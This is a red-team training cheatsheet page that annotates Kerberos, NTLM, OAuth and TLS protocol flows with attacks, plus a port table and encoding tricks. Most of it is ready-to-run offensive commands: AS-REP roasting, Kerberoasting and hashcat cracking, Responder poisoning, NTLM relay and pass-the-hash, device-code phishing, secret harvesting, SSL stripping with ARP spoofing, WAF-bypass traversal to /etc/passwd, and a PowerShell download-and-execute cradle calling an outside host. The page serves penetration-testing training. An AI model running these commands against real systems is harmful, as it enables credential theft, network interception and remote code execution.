---
layout: training-page
title: "Protocol Quick Reference — Red Team Cheatsheet"
module: "Reference"
tags:
  - reference
  - protocols
  - kerberos
  - ntlm
  - oauth
  - tls
  - cheatsheet
  - ports
  - encoding
page_key: "reference-protocol-reference"
render_with_liquid: false
---

# Protocol Quick Reference

Attack-oriented protocol flow diagrams and quick-lookup tables for the most commonly encountered protocols in red team operations. Bookmark this page.

---

## Kerberos Authentication Flow

```
CLIENT                    KDC (Key Distribution Center)           SERVICE
  |                              |                                    |
  |---[1] AS-REQ--------------->|                                    |
  |    (Username, timestamp      |                                    |
  |     encrypted with user key) |                                    |
  |                              |                                    |
  |<--[2] AS-REP----------------|                                    |
  |    (TGT encrypted with       |                                    |
  |     krbtgt hash)             |                                    |
  |    (Session key encrypted    |                                    |
  |     with user key)           |                                    |
  |                              |                                    |
  |---[3] TGS-REQ-------------->|                                    |
  |    (TGT + SPN requested)     |                                    |
  |                              |                                    |
  |<--[4] TGS-REP---------------|                                    |
  |    (Service ticket encrypted |                                    |
  |     with service account key)|                                    |
  |                              |                                    |
  |---[5] AP-REQ--------------------------------------------->|
  |    (Service ticket +         |                                    |
  |     authenticator)           |                                    |
```

**Attack annotations:**

| Step | Attack | Tool | Condition |
|------|--------|------|-----------|
| 1→2 | **AS-REP Roasting** | GetNPUsers.py | Pre-auth NOT required for account |
| 3→4 | **Kerberoasting** | GetUserSPNs.py | Any user can request TGS for any SPN |
| Step 2 | **Pass-the-Ticket** | Rubeus.exe ptt | Inject forged/stolen TGT |
| Step 2 (forge) | **Golden Ticket** | Mimikatz kerberos::golden | Know krbtgt NTLM hash |
| Step 4 (forge) | **Silver Ticket** | Mimikatz kerberos::silver | Know service account hash |
| Step 1 (no pre-auth) | **Overpass-the-Hash** | Mimikatz sekurlsa::pth | Have NTLM hash, need Kerberos |

```
# AS-REP Roasting (no pre-auth required):
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -no-pass

# Kerberoasting (any authenticated user):
GetUserSPNs.py domain.local/user:password -outputfile hashes.kerberoast

# Crack both with hashcat:
hashcat -m 18200 asrep-hashes.txt rockyou.txt  # AS-REP
hashcat -m 13100 tgs-hashes.txt rockyou.txt    # TGS (Kerberoast)
```

---

## NTLM Authentication Flow

```
CLIENT                              SERVER
  |                                    |
  |---[1] NTLM NEGOTIATE------------->|
  |    (Flags: NTLM, Unicode, etc.)   |
  |                                    |
  |<--[2] NTLM CHALLENGE--------------|
  |    (8-byte server challenge)       |
  |                                    |
  |---[3] NTLM AUTHENTICATE---------->|
  |    (NT hash response = HMAC-MD5   |
  |     of challenge + user NT hash)   |
```

**Attack annotations:**

| Attack | Position | Tool | What you get |
|--------|----------|------|-------------|
| **Capture NTLMv2** | Between [1] and [3] | Responder | NTLMv2 hash (crackable) |
| **NTLM Relay** | MitM all 3 messages | ntlmrelayx.py | Authenticated session to target |
| **Pass-the-Hash** | Skip steps 1-2 | pth-smb, smbclient | Direct auth as user |

```
# Responder — capture NTLMv2 hashes via LLMNR/NBT-NS poisoning:
responder -I eth0 -wrf

# NTLM relay to SMB (requires SMB signing disabled):
ntlmrelayx.py -t smb://192.168.1.10 -smb2support

# NTLM relay to LDAP (dump AD or add computer account):
ntlmrelayx.py -t ldap://dc01.domain.local --dump-adcs
ntlmrelayx.py -t ldap://dc01.domain.local --add-computer

# Pass-the-Hash:
smbclient -U "domain/user%aad3b435b51404eeaad3b435b51404ee:NT_HASH" //target/C$
```

---

## OAuth 2.0 Grant Types

| Grant Type | Use Case | Token in | MFA bypass? | Attack relevance |
|-----------|----------|----------|-------------|-----------------|
| Authorization Code | Web apps | Backend (code exchange) | No | redirect_uri, state CSRF |
| Authorization Code + PKCE | Mobile/SPA | Backend (code + verifier) | No | downgrade to no-PKCE |
| Implicit | Deprecated | URL fragment | No | token in Referer/History |
| Client Credentials | M2M | Backend | N/A | Client secret theft |
| **Device Code** | Browserless | Polling | **Yes** | Social engineer user to approve |
| Resource Owner Password | Legacy | Direct | No | Capture credentials directly |

```
# Device code attack flow:
POST https://login.microsoftonline.com/common/oauth2/v2.0/devicecode
→ Get user_code (e.g., "HNFKM9QZ") and verification_uri
→ Social engineer victim to visit verification_uri and enter user_code
→ Poll token endpoint with device_code until victim approves

# Client credentials (M2M) — steal client_secret from config files:
grep -r "client_secret\|CLIENT_SECRET" .env config/ app/
```

---

## TLS Handshake

```
CLIENT                                SERVER
  |                                     |
  |---ClientHello-------------------->  |
  |    (TLS version, cipher suites,     |
  |     random, SNI)                    |
  |                                     |
  |<--ServerHello--------------------|  |
  |    (Selected cipher, random)        |
  |<--Certificate--------------------|  |
  |    (Server's X.509 cert)            |
  |<--ServerHelloDone----------------|  |
  |                                     |
  |---ClientKeyExchange-------------->  |
  |    (Pre-master secret, encrypted    |
  |     with server public key)         |
  |---ChangeCipherSpec--------------->  |
  |---Finished----------------------->  |
  |<--ChangeCipherSpec----------------|  |
  |<--Finished------------------------|  |
  |                                     |
  |===Encrypted Application Data=====  |
```

**Attack points:**

```
# MITM with Burp Suite (needs CA in browser trust store):
# Add Burp CA: http://burp → Download certificate → Import to browser

# JA3 fingerprint — how C2 beacons get detected:
# JA3 = MD5(TLSversion,Ciphers,Extensions,EllipticCurves,EllipticCurveFormats)
# Cobalt Strike default JA3: 72a7c4bc836c75b1c5e3e4e5c23e94bc
# Change via custom Malleable C2 profile or meek transport

# SSL stripping (requires HSTS not set):
sslstrip -l 8080
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Test HTTPS enforcement:
curl -s -o /dev/null -w "%{http_code}" http://target.com   # should 301/redirect
curl -s -I target.com | grep "Strict-Transport-Security"
```

---

## Common Ports Quick Reference

| Port | Service | Protocol | Red Team Note |
|------|---------|----------|---------------|
| 21 | FTP | TCP | Anonymous login, cleartext credentials, PUT for upload |
| 22 | SSH | TCP | Password spray, key auth bypass, tunneling |
| 23 | Telnet | TCP | Cleartext — credentials sniffable |
| 25 | SMTP | TCP | Open relay testing, mail header injection |
| 53 | DNS | UDP/TCP | DNS tunneling (dnscat2, iodine), zone transfers |
| 80 | HTTP | TCP | Web app attacks, redirect to HTTPS check |
| 88 | Kerberos | TCP/UDP | AS-REP roasting, Kerberoasting, Golden Ticket |
| 110 | POP3 | TCP | Legacy email — credential spray, cleartext |
| 135 | RPC | TCP | DCE/RPC enumeration, DCOM exploitation |
| 139 | NetBIOS | TCP | SMB over NetBIOS, NTLM capture |
| 143 | IMAP | TCP | Credential spray, NTLM auth bypass |
| 389 | LDAP | TCP | AD enumeration (unauthenticated), null bind |
| 443 | HTTPS | TCP | Web app attacks over TLS |
| 445 | SMB | TCP | NTLM relay, PSExec, EternalBlue, lateral movement |
| 464 | kpasswd | TCP | Kerberos password change — used in attacks |
| 593 | RPC-HTTP | TCP | DCOM over HTTP (RPC endpoint mapper) |
| 636 | LDAPS | TCP | LDAP over TLS — AD enumeration |
| 1433 | MSSQL | TCP | xp_cmdshell, SQL auth, linked server abuse |
| 1521 | Oracle DB | TCP | Oracle TNS attacks |
| 3268 | GC | TCP | Global Catalog LDAP — forest-wide AD search |
| 3389 | RDP | TCP | Credential spray, BlueKeep, SharpRDP |
| 4444 | — | TCP | Default Metasploit/Meterpreter listen port |
| 5985 | WinRM-HTTP | TCP | Evil-WinRM, PSRemoting lateral movement |
| 5986 | WinRM-HTTPS | TCP | Evil-WinRM over TLS |
| 8080 | HTTP-alt | TCP | Web proxy, dev servers, Tomcat Manager |
| 8443 | HTTPS-alt | TCP | Dev servers, Tomcat HTTPS, management interfaces |
| 9200 | Elasticsearch | TCP | Unauthenticated data access |
| 27017 | MongoDB | TCP | Unauthenticated access (no auth default) |

---

## Encoding Quick Reference

```
# Base64
echo -n "string" | base64
echo "c3RyaW5n" | base64 -d
python3 -c "import base64; print(base64.b64decode('c3RyaW5n').decode())"

# URL encoding
python3 -c "import urllib.parse; print(urllib.parse.quote('string', safe=''))"
# Manual: space=%20, /=%2F, ?=%3F, ==%3D, &=%26, +=%2B, #=%23

# Double URL encoding (bypass filters)
python3 -c "import urllib.parse; s='<script>'; print(urllib.parse.quote(urllib.parse.quote(s)))"
# < = %3C (single) = %253C (double)

# HTML entities
# & → &amp;   < → &lt;   > → &gt;   " → &quot;   ' → &#x27;

# Hex encoding
echo -n "A" | xxd -p          # → 41
echo -n "admin" | xxd -p      # → 61646d696e
printf "\x61\x64\x6d\x69\x6e"  # → admin

# Unicode normalization (WAF bypass)
# / = U+002F (standard)
# ／= U+FF0F (fullwidth) — some WAFs don't normalize
# ∕ = U+2215 (division slash)
# Inject: https://target.com/..∕..∕etc∕passwd

# PowerShell encoding
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://x.com/a')"
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
# Use with: powershell -enc <base64>
```

---

## Resources

- Kerberos attack reference — `ired.team/offensive-security-experiments/active-directory-kerberos-abuse`
- NTLM relay guide — `github.com/SecureAuthCorp/impacket` (ntlmrelayx.py)
- OAuth 2.0 security considerations — `rfc-editor.org/rfc/rfc6819`
- TLS 1.3 specification — `rfc-editor.org/rfc/rfc8446`
- testssl.sh — comprehensive TLS testing — `testssl.sh`
- PayloadsAllTheThings encoding reference — `github.com/swisskyrepo/PayloadsAllTheThings`
